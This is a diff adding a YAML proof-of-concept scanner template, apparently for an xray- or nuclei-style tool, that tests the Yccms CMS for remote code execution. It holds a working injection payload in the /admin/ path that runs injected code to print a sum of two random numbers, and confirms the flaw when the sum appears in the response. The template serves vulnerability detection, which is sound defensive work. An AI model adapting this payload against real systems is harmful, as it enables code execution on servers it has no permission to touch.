@@ -1,0 +1,23 @@
+id: poc-yaml-yccms-rce
+info:
+  name: Yccms 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Yccms
+  reference: []
+  description: null
+variables:
+  r: random_int(100000, 910000)
+  r1: random_int(100000, 910000)
+transport: http
+requests:
+- method: GET
+  path: /admin/?a=Factory();print({{.r}}%2b{{.r1}});//../
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, r + r1)
+  output: []
